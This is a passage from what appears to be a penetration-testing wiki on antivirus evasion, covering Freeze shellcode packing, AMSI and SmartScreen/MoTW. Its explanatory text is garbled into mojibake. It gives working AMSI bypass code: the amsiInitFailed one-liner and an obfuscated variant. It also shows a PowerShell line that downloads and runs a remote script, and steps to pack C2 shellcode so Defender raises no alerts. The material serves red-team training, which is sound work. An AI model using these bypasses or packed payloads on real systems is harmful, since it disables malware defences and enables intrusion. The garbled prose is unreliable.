Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Evasion рдПрдХ рдмрд┐рд▓реНрд▓реА рдФрд░ рдЪреВрд╣реЗ рдХрд╛ рдЦреЗрд▓ рд╣реИ, рдЬреЛ рдЖрдЬ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рд╡рд╣ рдХрд▓ рдкрдХрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдХрднреА рднреА рдХреЗрд╡рд▓ рдПрдХ рдЙрдкрдХрд░рдг рдкрд░ рдирд┐рд░реНрднрд░ рди рд░рд╣реЗрдВ, рдпрджрд┐ рд╕рдВрднрд╡ рд╣реЛ рддреЛ, рдХрдИ Evasion рддрдХрдиреАрдХреЛрдВ рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред
{% endhint %}

## AMSI (Anti-Malware Scan Interface)

AMSI рдХрд╛ рдирд┐рд░реНрдорд╛рдг "[fileless malware](https://en.wikipedia.org/wiki/Fileless\_malware)" рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдкреНрд░рд╛рд░рдВрдн рдореЗрдВ, AV рдХреЗрд╡рд▓ **рдбрд┐рд╕реНрдХ рдкрд░ рдлрд╛рдЗрд▓реЛрдВ** рдХреЛ рд╕реНрдХреИрди рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдереЗ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ payloads рдХреЛ **рд╕реАрдзреЗ in-memory** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ AV рдЗрд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рднреА рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рдерд╛, рдХреНрдпреЛрдВрдХрд┐ рдЙрд╕рдХреЗ рдкрд╛рд╕ рдкрд░реНрдпрд╛рдкреНрдд рджреГрд╢реНрдпрддрд╛ рдирд╣реАрдВ рдереАред

AMSI рд╕реБрд╡рд┐рдзрд╛ Windows рдХреЗ рдЗрди рдШрдЯрдХреЛрдВ рдореЗрдВ рдПрдХреАрдХреГрдд рд╣реИред

* User Account Control, рдпрд╛ UAC (EXE, COM, MSI, рдпрд╛ ActiveX рд╕реНрдерд╛рдкрдирд╛ рдХрд╛ рдЙрдиреНрдирдпрди)
* PowerShell (рд╕реНрдХреНрд░рд┐рдкреНрдЯ, рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рдЙрдкрдпреЛрдЧ, рдФрд░ рдЧрддрд┐рд╢реАрд▓ рдХреЛрдб рдореВрд▓реНрдпрд╛рдВрдХрди)
* Windows Script Host (wscript.exe рдФрд░ cscript.exe)
* JavaScript рдФрд░ VBScript
* Office VBA macros

рдпрд╣ рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ рд╕рдорд╛рдзрд╛рдиреЛрдВ рдХреЛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдирд┐рд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдПрдХ рдРрд╕реЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдХрдЯ рдХрд░рдХреЗ рдЬреЛ рджреЛрдиреЛрдВ рдЕрдирдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдФрд░ рдЕрдирдСрдмреНрдлрд╕реНрдХреЗрдЯреЗрдб рд╣реИред

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` рдЪрд▓рд╛рдиреЗ рд╕реЗ Windows Defender рдкрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрд▓рд░реНрдЯ рдЙрддреНрдкрдиреНрди рд╣реЛрдЧрд╛ред

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ `amsi:` рдХреЛ рдХреИрд╕реЗ рдЬреЛрдбрд╝рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЙрд╕ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдХрд╛ рдкрде рдЬрд┐рд╕рд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓реА, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, powershell.exe

рд╣рдордиреЗ рдбрд┐рд╕реНрдХ рдкрд░ рдХреЛрдИ рдлрд╛рдЗрд▓ рдирд╣реАрдВ рдбрд╛рд▓реА, рд▓реЗрдХрд┐рди рдлрд┐рд░ рднреА AMSI рдХреЗ рдХрд╛рд░рдг in-memory рдореЗрдВ рдкрдХрдбрд╝реЗ рдЧрдПред

AMSI рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рдХреБрдЫ рддрд░реАрдХреЗ рд╣реИрдВ:

* **Obfuscation**

рдЪреВрдВрдХрд┐ AMSI рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рд╕реНрдерд┐рд░ рдкрддрд╛рд╕рд╛рдЬреА рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдк рдЬреЛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ рдЙрд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рдкрддрд╛рд╕рд╛рдЬреА рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рд╕реЗ рдмрдЪрдиреЗ рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, AMSI рдХреЗ рдкрд╛рд╕ рдХрдИ рдкрд░рддреЛрдВ рдХреЗ рдмрд╛рд╡рдЬреВрдж рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдХреЛ рдЕрдирдСрдмреНрдлрд╕реНрдХреЗрдЯ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП obfuscation рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЗрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реБрдП рдПрдХ рдЦрд░рд╛рдм рд╡рд┐рдХрд▓реНрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд╕реЗ рдмрдЪрдирд╛ рдЗрддрдирд╛ рд╕реАрдзрд╛ рдирд╣реАрдВ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХрднреА-рдХрднреА, рдЖрдкрдХреЛ рдмрд╕ рдХреБрдЫ рд╡реЗрд░рд┐рдПрдмрд▓ рдирд╛рдореЛрдВ рдХреЛ рдмрджрд▓рдиреЗ рдХреА рдЬрд░реВрд░рдд рд╣реЛрддреА рд╣реИ рдФрд░ рдЖрдк рдЕрдЪреНрдЫреЗ рд╣реЛрдВрдЧреЗ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХрд┐рддрдирд╛ рдХреБрдЫ рдЪрд┐рд╣реНрдирд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

* **AMSI Bypass**

рдЪреВрдВрдХрд┐ AMSI рдХреЛ powershell (рд╕рд╛рде рд╣реА cscript.exe, wscript.exe, рдЖрджрд┐) рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдПрдХ DLL рд▓реЛрдб рдХрд░рдХреЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ рдЫреЗрдбрд╝рдЫрд╛рдбрд╝ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдПрдХ рдЕрдирд╛рдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реЛред AMSI рдХреЗ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдореЗрдВ рдЗрд╕ рджреЛрд╖ рдХреЗ рдХрд╛рд░рдг, рд╢реЛрдзрдХрд░реНрддрд╛рдУрдВ рдиреЗ AMSI рд╕реНрдХреИрдирд┐рдВрдЧ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рдЦреЛрдЬреЗ рд╣реИрдВред

**рдПрдХ рддреНрд░реБрдЯрд┐ рдХреЛ рдордЬрдмреВрд░ рдХрд░рдирд╛**

AMSI рдкреНрд░рд╛рд░рдВрднреАрдХрд░рдг рдХреЛ рд╡рд┐рдлрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рдирд╛ (amsiInitFailed) рдХрд╛ рдкрд░рд┐рдгрд╛рдо рдпрд╣ рд╣реЛрдЧрд╛ рдХрд┐ рд╡рд░реНрддрдорд╛рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рд╕реНрдХреИрди рд╢реБрд░реВ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдореВрд▓ рд░реВрдк рд╕реЗ рдпрд╣ [Matt Graeber](https://twitter.com/mattifestation) рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдХрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдФрд░ Microsoft рдиреЗ рд╡реНрдпрд╛рдкрдХ рдЙрдкрдпреЛрдЧ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдпрд╛ рд╣реИред

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

рдХреЗрд╡рд▓ рдПрдХ рдкрдВрдХреНрддрд┐ рдХрд╛ powershell рдХреЛрдб рдерд╛ рдЬрд┐рд╕рдиреЗ AMSI рдХреЛ рд╡рд░реНрддрдорд╛рди powershell рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдкрдпреЛрдЧреА рдмрдирд╛ рджрд┐рдпрд╛ред рдпрд╣ рдкрдВрдХреНрддрд┐ AMSI рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рдпрдВ рд╣реА рдЪрд┐рд╣реНрдирд┐рдд рдХреА рдЧрдИ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╕рдВрд╢реЛрдзрди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

рдпрд╣рд╛рдБ рдПрдХ рд╕рдВрд╢реЛрдзрд┐рдд AMSI рдмрд╛рдпрдкрд╛рд╕ рд╣реИ рдЬрд┐рд╕реЗ рдореИрдВрдиреЗ рдЗрд╕ [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) рд╕реЗ рд▓рд┐рдпрд╛ рд╣реИред
```powershell
Try{#Ams1 bypass technic n┬║ 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.M├В┬гn├В┬гg' + 'e@+nt.Auto@' + '├В┬гtion.A' -join ''
$fdx = '@ms' + '├В┬гIn├В┬г' + 'tF@├В┬г' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('├В┬г','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('├В┬г','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
рдзреНрдпрд╛рди рд░рдЦреЗрдВ, рдпрд╣ рд╕рдВрднрд╡рддрдГ рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЗ рдмрд╛рд╣рд░ рдЖрдиреЗ рдХреЗ рдмрд╛рдж рдЪрд┐рд╣реНрдирд┐рдд рд╣реЛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдкрдХреА рдпреЛрдЬрдирд╛ рдЕрдкреНрд░рдХрдЯ рд░рд╣рдиреЗ рдХреА рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдХреЛрдИ рдХреЛрдб рдкреНрд░рдХрд╛рд╢рд┐рдд рдирд╣реАрдВ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

**рдореЗрдореЛрд░реА рдкреИрдЪрд┐рдВрдЧ**

рдЗрд╕ рддрдХрдиреАрдХ рдХреА рдЦреЛрдЬ рдореВрд▓ рд░реВрдк рд╕реЗ [@RastaMouse](https://twitter.com/\_RastaMouse/) рдиреЗ рдХреА рдереА рдФрд░ рдЗрд╕рдореЗрдВ "AmsiScanBuffer" рдлрдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдкрддрд╛ рдЦреЛрдЬрдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬреЛ amsi.dll рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ (рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛-рдкреНрд░рджрддреНрдд рдЗрдирдкреБрдЯ рдХреЛ рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рд╣реЛрддрд╛ рд╣реИ) рдФрд░ рдЗрд╕реЗ E_INVALIDARG рдХреЗ рдХреЛрдб рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЗ рд╕рд╛рде рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдирд╛, рдЗрд╕ рддрд░рд╣, рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕реНрдХреИрди рдХрд╛ рдкрд░рд┐рдгрд╛рдо 0 рд▓реМрдЯреЗрдЧрд╛, рдЬрд┐рд╕реЗ рд╕рд╛рдл рдкрд░рд┐рдгрд╛рдо рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

{% hint style="info" %}
рдХреГрдкрдпрд╛ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг рдХреЗ рд▓рд┐рдП [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) рдкрдврд╝реЗрдВред
{% endhint %}

рдкрд╛рд╡рд░рд╢реЗрд▓ рдХреЗ рд╕рд╛рде AMSI рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдЕрдиреНрдп рддрдХрдиреАрдХреЗрдВ рднреА рдкреНрд░рдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИрдВ, [**рдЗрд╕ рдкреГрд╖реНрда**](basic-powershell-for-pentesters/#amsi-bypass) рдФрд░ [рдЗрд╕ рд░реЗрдкреЛ](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) рдХреЛ рджреЗрдЦреЗрдВ рддрд╛рдХрд┐ рдЙрдирдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЬрд╛рди рд╕рдХреЗрдВред

рдпрд╛ рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЬреЛ рдореЗрдореЛрд░реА рдкреИрдЪрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣рд░ рдирдП Powersh рдХреЛ рдкреИрдЪ рдХрд░реЗрдЧреА

## рдСрдмреНрдлрд╕реНрдХреЗрд╢рди

рдХрдИ рдЙрдкрдХрд░рдг рд╣реИрдВ рдЬреЛ **C# рд╕реНрдкрд╖реНрдЯ-рдкрд╛рда рдХреЛрдб рдХреЛ рдСрдмреНрдлрд╕реНрдХреЗрдЯ рдХрд░рдиреЗ**, **рдореЗрдЯрд╛рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рдЯреЗрдореНрдкреНрд▓реЗрдЯреНрд╕ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ** рдФрд░ **рд╕рдВрдХрд▓рд┐рдд рдмрд╛рдЗрдирд░реАрдЬ рдХреЛ рдСрдмреНрдлрд╕реНрдХреЗрдЯ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдкреНрд░рдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# рдСрдмреНрдлрд╕реНрдХреЗрдЯрд░**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): рдЗрд╕ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп [LLVM](http://www.llvm.org/) рд╕рдВрдХрд▓рди рд╕реВрдЯ рдХрд╛ рдПрдХ рдУрдкрди-рд╕реЛрд░реНрд╕ рдлреЛрд░реНрдХ рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рд╣реИ рдЬреЛ [рдХреЛрдб рдСрдмреНрдлрд╕реНрдХреЗрд╢рди](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) рдФрд░ рдЯреИрдореНрдкрд░-рдкреНрд░реВрдлрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдмрдврд╝реА рд╣реБрдИ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдХреИрд╕реЗ `C++11/14` рднрд╛рд╖рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╕рдВрдХрд▓рди рд╕рдордп рдкрд░, рдХрд┐рд╕реА рднреА рдмрд╛рд╣рд░реА рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдмрд┐рдирд╛ рдФрд░ рдХрдВрдкрд╛рдЗрд▓рд░ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдП рдмрд┐рдирд╛ рдСрдмреНрдлрд╕реНрдХреЗрдЯреЗрдб рдХреЛрдб рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* [**obfy**](https://github.com/fritzone/obfy): C++ рдЯреЗрдореНрдкреНрд▓реЗрдЯ рдореЗрдЯрд╛рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рдлреНрд░реЗрдорд╡рд░реНрдХ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рдСрдмреНрдлрд╕реНрдХреЗрдЯреЗрдб рдСрдкрд░реЗрд╢рдиреНрд╕ рдХреА рдПрдХ рдкрд░рдд рдЬреЛрдбрд╝реЗрдВ рдЬреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд░рдЦрдиреЗ рд╡рд╛рд▓реЗ рд╡реНрдпрдХреНрддрд┐ рдХреЗ рдЬреАрд╡рди рдХреЛ рдереЛрдбрд╝рд╛ рдХрдард┐рди рдмрдирд╛ рджреЗрдЧреАред
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz рдПрдХ x64 рдмрд╛рдЗрдирд░реА рдСрдмреНрдлрд╕реНрдХреЗрдЯрд░ рд╣реИ рдЬреЛ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреЗ pe рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдСрдмреНрдлрд╕реНрдХреЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ: .exe, .dll, .sys рд╢рд╛рдорд┐рд▓ рд╣реИрдВ
* [**metame**](https://github.com/a0rtega/metame): Metame рдПрдХ рд╕рд░рд▓ рдореЗрдЯрд╛рдореЛрд░реНрдлрд┐рдХ рдХреЛрдб рдЗрдВрдЬрди рд╣реИ рдЬреЛ рдордирдорд╛рдиреЗ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓реНрд╕ рдХреЗ рд▓рд┐рдП рд╣реИред
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator рдПрдХ рдмрд╛рд░реАрдХ-рджрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдХреЛрдб рдСрдмреНрдлрд╕реНрдХреЗрд╢рди рдлреНрд░реЗрдорд╡рд░реНрдХ рд╣реИ рдЬреЛ LLVM-рд╕рдорд░реНрдерд┐рдд рднрд╛рд╖рд╛рдУрдВ рдХреЗ рд▓рд┐рдП ROP (рд░рд┐рдЯрд░реНрди-рдУрд░рд┐рдПрдВрдЯреЗрдб рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред ROPfuscator рдПрдХ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдЕрд╕реЗрдВрдмрд▓реА рдХреЛрдб рд╕реНрддрд░ рдкрд░ рдСрдмреНрдлрд╕реНрдХреЗрдЯ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╡рд╛рд╣ рдХреА рд╣рдорд╛рд░реА рдкреНрд░рд╛рдХреГрддрд┐рдХ рдзрд╛рд░рдгрд╛ рдХреЛ рдмрд╛рдзрд┐рдд рдХрд░рддрд╛ рд╣реИред
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt рдПрдХ .NET PE Crypter рд╣реИ рдЬреЛ Nim рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рд╣реИ
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor рдореМрдЬреВрджрд╛ EXE/DLL рдХреЛ рд╢реЗрд▓рдХреЛрдб рдореЗрдВ рдмрджрд▓рдиреЗ рдФрд░ рдлрд┐рд░ рдЙрдиреНрд╣реЗрдВ рд▓реЛрдб рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ

## SmartScreen & MoTW

рдЖрдкрдиреЗ рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдХреБрдЫ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓реНрд╕ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рддреЗ рд╕рдордп рдФрд░ рдЙрдиреНрд╣реЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╕рдордп рдпрд╣ рд╕реНрдХреНрд░реАрди рджреЗрдЦреА рд╣реЛрдЧреАред

Microsoft Defender SmartScreen рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рддрдВрддреНрд░ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдЕрдВрддрд┐рдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдХреЛ рдЪрд▓рд╛рдиреЗ рд╕реЗ рдмрдЪрд╛рдирд╛ рд╣реИред

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдкреНрд░рддрд┐рд╖реНрдард╛-рдЖрдзрд╛рд░рд┐рдд рджреГрд╖реНрдЯрд┐рдХреЛрдг рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЕрд░реНрдерд╛рддреН рдЕрд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдП рдЧрдП рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ SmartScreen рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВрдЧреЗ рдЬрд┐рд╕рд╕реЗ рдЕрдВрддрд┐рдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕рддрд░реНрдХ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдлрд╛рдЗрд▓ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛рдПрдЧрд╛ (рд╣рд╛рд▓рд╛рдВрдХрд┐ рдлрд╛рдЗрд▓ рдХреЛ рдЕрднреА рднреА More Info -> Run anyway рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдХреЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)ред

**MoTW** (Mark of The Web) рдПрдХ [NTFS Alternate Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) рд╣реИ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо Zone.Identifier рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдлрд╛рдЗрд▓реНрд╕ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рддреЗ рд╕рдордп рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╕рд╛рде рд╣реА рдЙрд╕ URL рдХреЗ рд╕рд╛рде рдЬрд╣рд╛рдВ рд╕реЗ рдпрд╣ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдлрд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП Zone.Identifier ADS рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛ред</p></figcaption></figure>

{% hint style="info" %}
